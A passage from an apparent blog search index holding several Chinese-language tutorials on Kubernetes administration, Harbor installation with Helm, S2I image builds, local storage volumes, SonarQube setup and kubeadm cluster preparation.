对象描述路由规则；Ingress Controller 通过与 Apiserver 交互，将 Ingress 规则写入 Nginx Pod 中。\nHelm 2 使用:\n1 helm install --name nginx-ingress --set \u0026#34;rbac.create=true,controller.service.externalIPs[0]=192.168.10.2\u0026#34; stable/nginx-ingress Helm 3 使用:\n1 helm install nginx-ingress --set \u0026#34;rbac.create=true,controller.service.externalIPs[0]=192.168.10.2\u0026#34; stable/nginx-ingress 查看服务：\n1 2 3 4 kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE nginx-ingress-controller LoadBalancer 10.109.17.54 192.168.10.2 80:31006/TCP,443:31184/TCP 30m nginx-ingress-default-backend ClusterIP 10.106.94.214 \u0026lt;none\u0026gt; 80/TCP 30m 这里采用 externalIP 方式对外暴露服务，nginx-ingress-controller 会在 192.168.10.2 节点（可以配置多个节点）上暴露 80/443 端口。\n2. 使用 Helm 安装 Harbor 下载 harbor-helm 安装包 1 2 git clone https://github.com/goharbor/harbor-helm.git git checkout 1.1.0 创建独立的命名空间 kubectl create namespace harbor 修改必要的参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 git diff --- a/values.yaml +++ b/values.yaml @@ -25,8 +25,8 @@ expose: commonName: \u0026#34;\u0026#34; ingress: hosts: - core: core.harbor.domain - notary: notary.harbor.domain + core: core.harbor.chenshaowen.com + notary: notary.harbor.chenshaowen.com # set to the type of ingress controller if it has specific requirements. # leave as `default` for most ingress controllers. # set to `gce` if using the GCE ingress controller @@ -95,7 +95,7 @@ expose: # the IP address of k8s node # # If Harbor is deployed behind the proxy, set it as the URL of proxy -externalURL: https://core.harbor.domain +externalURL: https://core.harbor.chenshaowen.com 也可以不修改，配置 hosts 进行访问。\n安装 Harbor helm install --name harbor -f values.yaml . --namespace harbor 通过执行 kubectl get pod -n harbor 命令，等待所有 Pod 正常启动。\n查看 1 2 3 kubectl get ingress -n harbor NAME HOSTS ADDRESS PORTS AGE harbor-harbor-ingress core.harbor.domain,notary.harbor.domain 80, 443 7m15s 配置域名，进行访问 需要将域名的 DNS 指向服务器地址。打开页面 https://core.harbor.chenshaowen.com ，输入默认的账号密码 admin : Harbor12345 ，就可以正常使用了。\n3. 推送镜像 登陆仓库 1 2 3 4 docker login core.harbor.chenshaowen.com Username: admin Password: Error response from daemon: Get https://core.harbor.chenshaowen.com/v2/: x509: certificate signed by unknown authority 提示证书问题，有两种解决办法：\n在 Docker 中添加受信任的证书 执行命令，获取证书，并将证书内容拷贝到配置目录：\n1 kubectl get secrets/harbor-harbor-ingress -n harbor -o jsonpath=\u0026#34;{.data.ca\\.crt}\u0026#34; | base64 --decode 添加 \u0026ndash;insecure-registry 仓库地址 以 OS X 为例，在 [Preferences] - [Daemon] 中添加不安全的仓库 core.harbor.chenshaowen.com 即可。\n打标签，推送镜像 1 2 3 4 5 6 docker tag sonarqube:7.1 core.harbor.chenshaowen.com/library/snoarque:7.1 docker push core.harbor.chenshaowen.com/library/snoarque:7.1 The push refers to repository [core.harbor.chenshaowen.com/library/snoarque] 195b3d541b37: Pushed 8fb1d730c37c: Pushing [=============\u0026gt; ] 48.57MB/177.1MB 1e09c232b1a9: Pushed 查看镜像 ","description":"","id":356,"section":"post","tags":["博文","Kubernetes","Harbor","Ingress","Helm","镜像仓库","镜像"],"title":"使用 Helm 安装 harbor","uri":"https://www.chenshaowen.com/blog/install-harbor-using-helm.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. NodePort 服务仅指定 Node 可以访问 通过 NodePort 暴露的服务，在集群外可以使用 Kubernetes 任意 Node IP 加端口的形式访问。kube-proxy 会将访问流量以轮询的方式转发给 service 中的每个 Pod。\n但是，发现并不是每一个 Node IP 加端口都可以访问，仅运行 Pod 的 Node 可以。\n原因是，任意 Node IP 加端口访问，是通过主机间通信实现的。但是 docker 1.13 版本之后对 iptables 规则进行了改动，默认禁用了 FORWARD 。\n查看 iptables 规则：\n1 2 3 4 5 iptables -L -n ... Chain FORWARD (policy DROP) ... 打开全局 FORWARD ：\n1 iptables -P FORWARD ACCEPT 2. 登陆 Kubernetes 中的容器终端 命令格式 1 kubectl exec -it {POD_NAME} -c {CONTAINER_NAME} -n {NAMESPACE_NAME} sh 如果 Pod 中只有一个 Container，则 -c {CONTAINER_NAME} 参数可以省略。\n获取 Pod 名称 1 2 3 kubectl get pod -n monitor monitor prometheus-alertmanager-5bc4ccf9df-xmt7c 2/2 Running 6 3d23h 获取 Container 名称 1 2 3 4 kubectl log prometheus-alertmanager-5bc4ccf9df-xmt7c -n monitor log is DEPRECATED and will be removed in a future version. Use logs instead. Error from server (BadRequest): a container name must be specified for pod prometheus-alertmanager-5bc4ccf9df-xmt7c, choose one of: [prometheus-alertmanager prometheus-alertmanager-configmap-reload] 提示信息中，[prometheus-alertmanager prometheus-alertmanager-configmap-reload] 就是 Pod 中全部容器列表。\n登陆 Container 终端 kubectl exec -it prometheus-alertmanager-5bc4ccf9df-xmt7c -c prometheus-alertmanager -n monitor sh 3. 批量删除 PVC 1 2 kubectl get pvc -A | awk \u0026#39;{print $2}\u0026#39; |grep {KEYWORD} |xargs kubectl delete pvc -n {NAME_SPACE} 4. 使用 StorageClass 提供 PV 动态存储 StorageClass 动态存储的特点是，管理员只需要创建存储服务、服务相关的 provisioner，而不用指定 PV 的大小。当用户使用存储时，只需要创建 PVC，Provisioner 会自动创建 PV 与之匹配。\n在 CentOS 上搭建 NFS 服务，参考链接 。\n安装 nfs-client-provisioner\nhelm2 1 helm install --name nfs-client --set nfs.server=x.x.x.x --set nfs.path=/data stable/nfs-client-provisioner helm3 1 2 helm repo add stable https://charts.helm.sh/stable helm install nfs-client stable/nfs-client-provisioner --set nfs.server=x.x.x.x --set nfs.path=/data 但 nfs-client-provisioner 已经停止维护，同时不支持高版本的 Kubernetes，推荐使用 csi-nfs 方案。\n查看 StorageClass 1 2 3 kubectl get sc nfs-client cluster.local/nfs-client-nfs-client-provisioner 18s 指定 DefaultStorageClass 1 kubectl patch storageclass nfs-client -p \u0026#39;{\u0026#34;metadata\u0026#34;: {\u0026#34;annotations\u0026#34;:{\u0026#34;storageclass.kubernetes.io/is-default-class\u0026#34;:\u0026#34;true\u0026#34;}}}\u0026#39; 创建一个 PVC 测试 新建文件 pvc.yaml\n1 2 3 4 5 6 7 8 9 10 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc1 spec: accessModes: - ReadWriteOnce resources: requests: storage: 30Gi 执行命令：\n1 kubectl create -f pvc.yaml 查看 PVC：\n1 2 3 4 kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE pvc1 Bound pvc-24e4dfc1-cb8b-444b-8e3c-36ec8350df3c 30Gi RWX nfs-client 2m 可以看到 pvc1 状态已经是 Bound，同时在 nfs 共享目录下发现，新文件夹 default-pvc1-pvc-24e4dfc1-cb8b-444b-8e3c-36ec8350df3c 。\n5. 部署 csi-nfs 安装 cis-driver-nfs 1 2 helm repo add csi-driver-nfs https://raw.githubusercontent.com/kubernetes-csi/csi-driver-nfs/master/charts helm install csi-driver-nfs csi-driver-nfs/csi-driver-nfs --namespace kube-system --version v4.9.0 创建 StorageClass 1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: nfs-csi-node1 provisioner: nfs.csi.k8s.io parameters: server: x.x.x.x share: /data/nfs reclaimPolicy: Delete volumeBindingMode: Immediate mountOptions: - nfsvers=4.1 有些公有云的 NFS 可能不支持 nfsvers=4.1，可以尝试去掉这个参数。\n创建测试 PVC 1 2 3 4 5 6 7 8 9 10 11 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: nfs-csi-node1-test spec: accessModes: - ReadWriteOnce resources: requests: storage: 30Gi storageClassName: nfs-csi-node1 ","description":"","id":357,"section":"post","tags":["博文","Tips","NodePort","Kubernetes","StorageClass","存储"],"title":"开发 Tips（13）","uri":"https://www.chenshaowen.com/blog/developing-tips-13.html"},{"content":"1. S2I 能解决什么问题 可以预见的是，未来大量的应用会以容器的方式进行部署。\n容器平台关注的是镜像和容器，应用开发关注的是业务代码，而最终代码需要以镜像的方式进行部署。从代码到镜像，就是 Source To Image ，即 S2I 。\n在前面的文章 PaaS 部署之 buildpack 中，描述到一个应用运行起来之前，需要进行一些必要的配置。这些配置包括运行依赖、环境变量、服务地址等。\nS2I 提供 buildpack 类似的功能，但 S2I 提供的方式更加通用化、更加容器化。\n2. S2I 的特点 上图是 S2I 的工作流，S2I CLI 依赖于 Docker 环境。\n主要分为两步：\n通过 BASE IMAGE 、S2I Scripts 构建应用的基础镜像 将源码移动到应用的基础镜像，仅添加一层文件，得到最终的镜像文件 BASE IMAGE 是一些通用的镜像，例如，Python、CentOS、Nodejs 等。S2I Scripts 通常是一些固定的流程脚本，比如变更数据库、拷贝静态文件等。\nS2I 的特点：\n速度，S2I 可以实现很复杂的操作逻辑，而不会创建新的镜像层，所以运行起来很快。 打补丁，如果所依赖的镜像需要安全补丁，S2I 允许你一次性重新构建所有镜像。 高效，在构建过程中，S2I 不允许运行任意的 yum install 命令，以防止降低开发迭代速度 生态，S2I 鼓励一个共享镜像生态。从而你的应用可以实现最佳实践。 S2I 能够通过目录下的文件探测语言，如果有 Dockerfile 将会退化为非 S2I 的方式使用 Dockerfile 进行构建。\n识别的语言 探测的文件 java pom.xml nodejs app.json, package.json perl cpanfile、index.pl php composer.json、index.php python requirements.txt、setup.py ruby Gemfile, Rakefile、config.ru scala build.sbt golang Godeps, main.go 3. S2I 与 buildpack 区别 buildpack 是 CloudFoundry 提供的一种打包应用的工具。buildpack 对应用及其依赖进行构建、打包和更新，让开发人员更加专注在业务逻辑实现。\nbuildpack 最终会得到一个 droplet。droplet 是一个应用的可运行实例，运行在 dea（droplet execution agent）上。\nS2I 是 OpenShift 推出的一种基于容器的应用镜像构建工具。S2I 面向容器，试图解决的问题更为通用。\nS2I 最终会得到一个镜像，可以部署在任意容器平台。\n4. 尝试使用 S2I 操作之前，请确保本地有可用的 Docker 环境。\n创建一个 Django 工程 1 2 3 4 5 6 7 8 9 10 11 12 13 pip install django==1.11 django-admin startproject django_example echo django==1.11 \u0026gt; ./django_example/requirements.txt tree -L 3 . └── django_example ├── django_example │ ├── __init__.py │ ├── settings.py │ ├── urls.py │ └── wsgi.py ├── manage.py └── requirements.txt 添加 requirements.txt 是为了让脚本识别应用。\n安装 S2I ，以 OS X 为例： 1 brew install source-to-image 构建应用镜像 build 命令格式 1 2 3 s2i build -h Usage: s2i build \u0026lt;source\u0026gt; \u0026lt;image\u0026gt; [\u0026lt;tag\u0026gt;] [flags] source ，构建源码。可以是本地仓库，也可以是远程仓库 image，基础镜像 tag，生成的镜像 flags，构建参数，比如添加证书、设置网络等 开始构建应用 centos/python-35-centos7 是一个 Python 3.5 应用的 S2I 基础镜像，点击查看。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 s2i build django_example centos/python-35-centos7 hello-django ---\u0026gt; Installing application source ... ---\u0026gt; Installing dependencies ... Collecting django==1.11 (from -r requirements.txt (line 1)) Downloading https://files.pythonhosted.org/packages/47/a6/078ebcbd49b19e22fd560a2348cfc5cec9e5dcfe3c4fad8e 64c9865135bb/Django-1.11-py2.py3-none-any.whl (6.9MB) Collecting pytz (from django==1.11-\u0026gt;-r requirements.txt (line 1)) Downloading https://files.pythonhosted.org/packages/87/76/46d697698a143e05f77bec5a526bf4e56a0be 61d63425b68f4ba553b51f2/pytz-2019.2-py2.py3-none-any.whl (508kB) Installing collected packages: pytz, django Successfully installed django-1.11 pytz-2019.2 You are using pip version 7.1.2, however version 19.2.3 is available. You should consider upgrading via the \u0026#39;pip install --upgrade pip\u0026#39; command. ---\u0026gt; Collecting Django static files ... WARNING: could not run \u0026#39;manage.py collectstatic\u0026#39;. To debug, run: python ./manage.py collectstatic --noinput Ignore this warning if you\u0026#39;re not serving static files with Django. Build completed successfully 查看镜像 1 2 3 docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-django latest 042c6143ecf9 50 seconds ago 669MB 运行应用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 docker run -p 8080:8080 hello-django ---\u0026gt; Migrating database ... Operations to perform: Apply all migrations: admin, auth, contenttypes, sessions Running migrations: Applying contenttypes.0001_initial... OK Applying auth.0001_initial... OK Applying admin.0001_initial... OK Applying admin.0002_logentry_remove_auto_add... OK Applying contenttypes.0002_remove_content_type_name... OK Applying auth.0002_alter_permission_name_max_length... OK Applying auth.0003_alter_user_email_max_length... OK Applying auth.0004_alter_user_username_opts... OK Applying auth.0005_alter_user_last_login_null... OK Applying auth.0006_require_contenttypes_0002... OK Applying auth.0007_alter_validators_add_error_messages... OK Applying auth.0008_alter_user_username_max_length... OK Applying sessions.0001_initial... OK ---\u0026gt; Serving application with \u0026#39;manage.py runserver\u0026#39; ... WARNING: this is NOT a recommended way to run you application in production! Consider using gunicorn or some other production web server. Performing system checks... System check identified no issues (0 silenced). August 26, 2019 - 08:08:36 Django version 1.11, using settings \u0026#39;django_example.settings\u0026#39; Starting development server at http://0.0.0.0:8080/ Quit the server with CONTROL-C. 查看应用 5. 参考 https://github.com/openshift/source-to-image https://github.com/sclorg/s2i-python-container https://www.openshift.com/blog/create-s2i-builder-image ","description":"","id":358,"section":"post","tags":["博文","S2I","Docker"],"title":"使用 S2I 构建云原生应用","uri":"https://www.chenshaowen.com/blog/using-s2i-to-build-cloud-native-applications.html"},{"content":" 之前通过 Kubernetes 之 Volumes ，对 Volumes 有了一定的了解。本篇主要侧重实践，学习如何使用 emptydir、hostpath、localvolume 三种本地存储方案。\n1. PV 的基本属性 1.1 PV 的生命周期 PV 的状态：\nAvailable：可用，还未被任何 PVC 绑定 Bound：已经被 PVC 绑定 Released：PVC 被删除，但是资源还未被重新声明 Failed：自动回收失败 1.2 PV 的回收策略 PersistentVolumeReclaimPolicy，即 PV 的回收策略。\n当 Pod 不需要 PV 时，如何处理：\nRetain：保留数据，需要管理员手工清理数据 Recycle：资源回收，清除 PV 中的数据 Delete：直接删除 PV 目前只有 NFS 和 HostPath 类型卷支持回收策略，AWS EBS、GCE PD、Azure Disk 和 Cinder 支持 Delete 策略。\n1.3 PV 的访问模式 PV 的访问模式（accessModes）：\nReadWriteOnce：PV 以 read-write 挂载到一个 Pod ReadWriteMany：PV 以 read-write 方式挂载到多个 Pod ReadOnlyMany：PV 以 read-only 方式挂载到多个 Pod 2. emptyDir 使用 emptyDir 时，Kubernetes 在 Node 上自动分配一个目录给 Pod。此目录中，初始内容为空，当 Pod 从 Node 上移除时，emptyDir 中的数据也被移除。\n主要用于无需永久保存的临时目录，多个容器的共享目录等场景。\n创建文件 emptydir.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 apiVersion: v1 kind: Pod metadata: name: emptydir spec: containers: - image: busybox name: app volumeMounts: - mountPath: /logs name: shared-dir args: - /bin/sh - -c - echo emptydir \u0026gt;\u0026gt; /logs/app.log; sleep 60000 - image: busybox name: log-collector volumeMounts: - mountPath: /app_logs name: shared-dir args: - /bin/sh - -c - cat /app_logs/app.log; sleep 60000 volumes: - name: shared-dir emptyDir: {} 执行命令：\n1 2 3 kubectl apply -f emptydir.yaml kubectl exec emptydir -c log-collector cat /app_logs/app.log emptydir 可以看到两个容器之间，实现了文件共享的功能。\n3. hostPath hostPath 类型是映射 Node 文件系统中的文件或者目录到 Pod 。支持的类型有文件、目录、File、Socket、CharDevice 和 BlockDevice。\n创建文件 hostpath.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 apiVersion: v1 kind: Pod metadata: name: pod-hostpath spec: nodeSelector: kubernetes.io/hostname: i-6fns0nua containers: - image: busybox name: app volumeMounts: - mountPath: /logs name: shared-dir args: - /bin/sh - -c - echo hostpath \u0026gt;\u0026gt; /logs/app.log; sleep 60000 volumes: - name: shared-dir hostPath: path: /data/logs 登陆主机 i-6fns0nua ，创建目录 1 mkdir -p /data/logs 创建 hostpath 1 kubectl apply -f pod.yaml 登陆主机 i-6fns0nua ，查看共享文件 1 2 cat /data/logs/app.log hostpath 4. local volume local volume 适合的场景：\n数据缓存，应用可以就近访问数据，快速处理。 分布式存储系统，如分布式数据库，分布式文件系统。 4.1 创建静态存储 创建文件 sc.yaml\n1 2 3 4 5 6 apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: local provisioner: kubernetes.io/no-provisioner volumeBindingMode: WaitForFirstConsumer pv.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: v1 kind: PersistentVolume metadata: name: local1 spec: capacity: storage: 30Gi volumeMode: Filesystem accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Retain storageClassName: local local: path: /data/local1 nodeAffinity: required: nodeSelectorTerms: - matchExpressions: - key: kubernetes.io/hostname operator: In values: - i-6fns0nua 4.2 Pod 使用 创建文件 pvc.yaml\n1 2 3 4 5 6 7 8 9 10 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc1 spec: accessModes: - ReadWriteMany resources: requests: storage: 30Gi Kubernetes 会自动对 PV 和 PVC 进行匹配。下面是在 Pod 中通过 PVC 使用存储。\npod.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kind: Pod apiVersion: v1 metadata: name: pod1 spec: containers: - name: nginx1 image: nginx volumeMounts: - mountPath: \u0026#34;/var/www/html\u0026#34; name: pod1 volumes: - name: pod1 persistentVolumeClaim: claimName: pvc1 ","description":"","id":359,"section":"post","tags":["博文","Kubernetes","Volume","存储"],"title":"在 Kubernetes 中使用 emptyDir、hostPath、localVolume","uri":"https://www.chenshaowen.com/blog/using-emptydir-hostpath-localvolume-in-kubernetes.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Kubernetes 中给 Node 增加 Role: worker 1 2 3 4 kubectl get nodes NAME STATUS ROLES AGE VERSION i-6fns0nua Ready master 6d3h v1.15.2 i-m69skuyd Ready \u0026lt;none\u0026gt; 6d2h v1.15.2 1 2 kubectl label node i-m69skuyd node-role.kubernetes.io/worker= node/i-m69skuyd labeled 1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION i-6fns0nua Ready master 6d3h v1.15.2 i-m69skuyd Ready worker 6d2h v1.15.2 2. 删除 Kubernetes 的一个节点 查看当前节点：\n1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION i-6fns0nua Ready master 6d3h v1.15.2 i-m69skuyd Ready worker 6d2h v1.15.2 迁移 Pod ，禁止调度待删除节点：\n1 kubectl drain i-m69skuyd --delete-local-data --force --ignore-daemonsets 删除节点：\n1 kubectl delete node i-m69skuyd 3. Kubernetes 上用 Helm 安装 Prometheus 首先需要创建 PV，可以参考第一章节。\n然后，执行命令：\n1 2 3 4 5 helm install --namespace monitor --name prometheus stable/prometheus \\ --set alertmanager.persistentVolume.storageClass=\u0026#34;local\u0026#34; \\ --set server.persistentVolume.storageClass=\u0026#34;local\u0026#34; helm install --namespace monitor --name grafana stable/grafana \\ --set persistence.storageClassName=\u0026#34;local\u0026#34; 其他操作可以参考，在 Minikube 集群上安装 Prometheus。\n4. 如何重启 Kubernetes 中的 Pod 或服务 重启 Pod 如果 Pod 关联了副本控制器，直接删除 Pod，Kubernetes 会重新创建 Pod 。\n查看 Pod 1 kubectl get pod -n {NAMESPACE} 删除 Pod 1 kubectl delete pod {POD_NAME} -n {NAMESPACE} 另外一种是，使用 replace 。\n1 kubectl replace --force -f pod.yaml 如果没有 pod.yaml 文件，可以直接使用下面的命令：\n1 kubectl get pod {POD_NAME} -n {NAMESPACE} -o yaml | kubectl replace --force -f - 重启 Deployment 将服务的副本数设置为 0，然后恢复原始的副本数。\n查看服务 1 kubectl get deployment -n {NAMESPACE} 设置副本数为 0 1 kubectl scale deployment {DEPLOYMENT_NAME} --replicas=0 -n {NAMESPACE} 恢复副本数量 1 kubectl scale deployment {DEPLOYMENT_NAME} --replicas={REPLICAS_NUM} -n {NAMESPACE} 5. 通过 NodePort 的方式，暴露正在运行的服务 在服务没有启动之前，通过修改 yaml 配置，可以暴露服务。当服务已经运行起来之后，可以通过 patch 的方式暴露服务。\n查看服务 1 kubectl get service -n {NAMESPACE} 暴露端口访问 1 kubectl patch service {SERVICE_NAME} -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;}}\u0026#39; -n {NAMESPACE} ","description":"","id":360,"section":"post","tags":["博文","Tips","Kubernetes"],"title":"开发 Tips（12）","uri":"https://www.chenshaowen.com/blog/developing-tips-12.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. 打开 OS X 原生 NTFS 支持 插上磁盘，查看盘符 1 2 3 4 5 6 diskutil list diskutil list /dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *96.9 GB disk2 1: Windows_NTFS SSD 96.8 GB disk2s1 这里的 SSD 就是 Volume Name。\n更新 /etc/fstab文件 1 sudo nano /etc/fstab 输入密码，然后输入 LABEL=SSD none ntfs rw,auto,nobrowse，其中 SSD 为 Volume Name。\n按 Ctrl + X，接着按 Y 保存。\n创建访问链接 1 sudo ln -s /Volumes/SSD ~/Desktop/SSD SSD 为 Volume Name ，需要更具具体情况替换。\n2. Docker 内部访问宿主机服务 在 Docker 中，直接使用 localhost 访问宿主机服务，报错网络不通，需要借助 docker0 。\n在 Linux 中，查看宿主机 docker0 的 IP 地址，执行命令： 1 ip addr show docker0 在 OS X 中，可以直接使用地址。 1 docker.for.mac.host.internal 3. Kubectl 配置多个集群 在进行 Kubernetes 相关开发时，通常会涉及多个集群的管理。Kubectl 提供了多集群上下文管理的功能。\n通常 Kubectl 的配置信息在 $HOME/.kube/config 或 /etc/kubernetes/admin.conf 。登陆机器，查看集群的配置信息，按照下面的格式进行编辑。\nkubeconfig 配置格式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 apiVersion: v1 kind: Config preferences: {} clusters: - cluster: certificate-authority-data: xxx server: xxx name: {cluster-name1} - cluster: certificate-authority-data: xxx server: xxx name: {cluster-name2} users: - name: {user-name1} user: xxx - name: {user-name2} user: xxx contexts: - context: cluster: {cluster-name1} user: {user-name1} name: {context-name1} - context: cluster: {cluster-name2} user: {user-name2} name: {context-name2} current-context: {context-name1} 查看集群\n1 kubectl config get-contexts 查看 config 信息\n1 kubectl config view 切换集群\n1 kubectl config use-context {context-name} 4. helm 提示 cannot get resource \u0026ldquo;namespaces\u0026rdquo; 使用 helm 安装应用：\n1 2 helm install --name prometheus-operator --namespace=monitoring stable/prometheus-operator Error: namespaces \u0026#34;monitoring\u0026#34; is forbidden: User \u0026#34;system:serviceaccount:kube-system:default\u0026#34; cannot get resource \u0026#34;namespaces\u0026#34; in API group \u0026#34;\u0026#34; in the namespace \u0026#34;monitoring\u0026#34; 解决办法，添加服务账号：\n1 2 3 kubectl create serviceaccount --namespace kube-system tiller kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller kubectl patch deploy --namespace kube-system tiller-deploy -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;spec\u0026#34;:{\u0026#34;serviceAccount\u0026#34;:\u0026#34;tiller\u0026#34;}}}}\u0026#39; ","description":"","id":361,"section":"post","tags":["博文","Tips","NTFS","Kubectl","Helm"],"title":"开发 Tips（11）","uri":"https://www.chenshaowen.com/blog/developing-tips-11.html"},{"content":"1. 谁需要 SonarQube 代码审查是高质量软件开发过程中不可缺少的重要环节，能帮助开发者及时发现代码中的 Bug，提升代码质量、可维护性。\n代码审查的维度包括，语言规范、代码风格、设计合理等。人工检查这些事项，会消耗大量的精力和时间。\n代码质量分析工具为此而生，帮助开发者从重复、繁琐地审查中解脱出来，聚焦于功能设计和实现。代码格式、语法规范、程序 Bug 等审查都交给代码质量分析工具。\n对于在 Github 等公网上托管的项目，有大量可用的 SaaS 服务，例如，Code Climate、Codacy。通常，它们与 Github 直接打通，提供免费的代码质量分析服务。\n但是在企业内网中，没有外网，代码敏感，我们需要支持私有化部署的代码质量分析工具。SonarQube 就是一个开源、可私有化部署的代码质量分析工具。\n2. SonarQube 是什么 SonarQube 是一个开源的代码质量管理系统。特征：\n支持超过25种编程语言，Java、C/C++、C#、PHP、Flex、Groovy、JavaScript、Python、PL/SQL、COBOL 等 提供重复代码、编码标准、单元测试、代码覆盖率、代码复杂度、潜在 Bug、注释和软件设计报告 提供了指标历史记录 支持与 Maven、Ant、Gradle 、Atlassian Bamboo、Jenkins、Hudson 等集成 支持 IDE 集成 支持 JIRA、Mantis、LDAP、Fortify 等外部工具集 支持扩展插件 3. SonarQube 安装 SonarQube 由两部分组成：\nSonarQube，服务端平台 sonar-scanner，客户端代码分析、结果上报 3.1 服务器端安装 这里采用 docker-compose 的方式运行 SonarQube。\n新建文件 docker-compose.yml ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 version: \u0026#39;2\u0026#39; services: sonarqube: image: sonarqube:7.1 ports: - \u0026#34;9000:9000\u0026#34; links: - postgres environment: - SONARQUBE_JDBC_URL:jdbc:postgresql://db:5432/sonar postgres: image: postgres:9.6.15 volumes: - ./postgres:/var/lib/postgresql/data ports: - \u0026#34;5432:5432\u0026#34; environment: - POSTGRES_USER=sonar - POSTGRES_PASSWORD=sonar 在文件所在目录，新建空目录 postgres ，然后执行命令:\n1 docker-compose up 3.2 客户端安装 以 OS X 为例，\n1 2 3 4 brew install sonar-scanner ==\u0026gt; Downloading https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar ######################################################################## 100.0% 🍺 /usr/local/Cellar/sonar-scanner/4.0.0.1744: 7 files, 631KB, built in 25 seconds 4. 项目测试 使用 SonarQube 时，需要提供一些必要的参数，例如，SonarQube Server 的地址、源码位置等。\n有两种方式可以提供这些参数：\n通过命令行 Python 项目：\n1 2 3 4 5 6 7 8 9 10 sonar-scanner -Dsonar.projectKey=bk-sops -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000 -Dsonar.language=\u0026#34;py\u0026#34; ... INFO: More about the report processing at http://localhost:9000/api/ce/task?id=AWyzn_gfzoHby8A3MxUD INFO: Task total time: 18.141 s INFO: ------------------------------------------------------------------------ INFO: EXECUTION SUCCESS INFO: ------------------------------------------------------------------------ INFO: Total time: 20.403s INFO: Final Memory: 7M/37M INFO: ------------------------------------------------------------------------ 通过配置文件 新建配置文件 sonar-project.properties :\n1 2 3 4 5 6 7 8 sonar.projectKey=devops-python-sample sonar.projectName=devops-python-sample sonar.host.url=http://localhost:9000 #本地可以缺省，如果是远程服务，需要修改为合适地址 sonar.projectVersion=1.0 sonar.sources=./ sonar.language=py sonar.sourceEncoding=UTF-8 # sonar.login=xxxxxx 登陆信息 执行命令：\n1 2 3 4 5 6 7 8 9 10 sonar-scanner ... INFO: More about the report processing at http://127.0.0.1:9000/api/ce/task?id=AWyzoVZVzoHby8A3MxUE INFO: Task total time: 5.260 s INFO: ------------------------------------------------------------------------ INFO: EXECUTION SUCCESS INFO: ------------------------------------------------------------------------ INFO: Total time: 7.583s INFO: Final Memory: 7M/34M INFO: ------------------------------------------------------------------------ 下面查看 SonarQube 的分析页面：\n首页\n项目页面\n缺陷展示\n5. 参考 https://zh.wikipedia.org/wiki/SonarQube https://github.com/SonarSource/sonarqube ","description":"","id":362,"section":"post","tags":["博文","SonarQube","DevOps"],"title":"代码质量分析工具 SonarQube","uri":"https://www.chenshaowen.com/blog/sonarqube-of-code-quality-analysis-tool.html"},{"content":"1. 集群规划 准备三个主机，一个 Master ，两个 Node。\n操作系统，CentOS 7 配置，2 Core 4 GB Docker 版本，18.06.3 Kubernetes 版本，1.15.3 如果是购买的云主机，请将以下端口打开:\n1 2 3 4 5 6 7 8 9 10 11 12 # Master TCP 6443* Kubernetes API Server TCP 2379-2380 etcd server client API TCP 10250 Kubelet API TCP 10251 kube-scheduler TCP 10252 kube-controller-manager TCP 10255 Read-Only Kubelet API # Nodes TCP 10250 Kubelet API TCP 10255 Read-Only Kubelet API TCP 30000-32767 NodePort Services 2. Master 和 Node 节点操作 在使用 Kubeadm 安装 Kubernetes 之前，全部节点需要进行一些基础配置和安装。\n2.1 hosts 配置（非必须） 配置 hosts 是为了能够通过主机名找到其他主机。\n首先查看主机名，执行:\n1 hostname 这里假设主机名分别为 i-6fns0nua （192.168.10.2），i-m69skuyd（192.168.10.3），i-h29fw205（192.168.10.4）。\n分别在每个主机上配置 hosts:\n1 2 3 4 cat /etc/hosts 192.168.10.2 i-6fns0nua master 192.168.10.3 i-m69skuyd node1 192.168.10.4 i-h29fw205 node2 2.2 系统配置 关闭并禁用防火墙 1 2 systemctl stop firewalld systemctl disable firewalld 关闭并禁用 selinux 1 2 setenforce 0 sed -i \u0026#39;s/SELINUX=permissive/SELINUX=disabled/\u0026#39; /etc/sysconfig/selinux 关闭并禁用 swap 1 2 swapoff -a sed -i \u0026#39;s/.*swap.*/#\u0026amp;/\u0026#39; /etc/fstab 当前的 Kubernetes 版本不支持 swap。\n配置转发相关参数 1 2 3 4 5 6 7 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward=1 vm.swappiness=0 EOF sysctl --system 开启 ipvs 的前置条件 1 2 3 4 5 6 7 8 9 10 cat \u0026gt; 